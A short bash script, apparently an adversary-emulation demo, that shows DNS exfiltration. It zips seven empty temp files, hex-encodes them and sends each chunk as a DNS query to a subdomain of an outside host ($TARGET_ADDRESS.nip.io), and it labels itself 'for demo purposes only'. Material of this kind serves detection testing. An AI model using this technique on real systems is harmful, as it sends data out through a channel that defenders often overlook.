#! /bin/bash

echo -e "Executing Exfiltration Over Alternative Protocol using a DNS tool sendng requests to large domain names. This will take a moment to execute..." 

cd /tmp
touch {1..7}.tmp
zip -qm - *tmp|xxd -p >data
for dat in `cat data `; do dig $dat.$TARGET_ADDRESS.nip.io; done > /dev/null 2>&1
rm data

#this script is for demo purposes only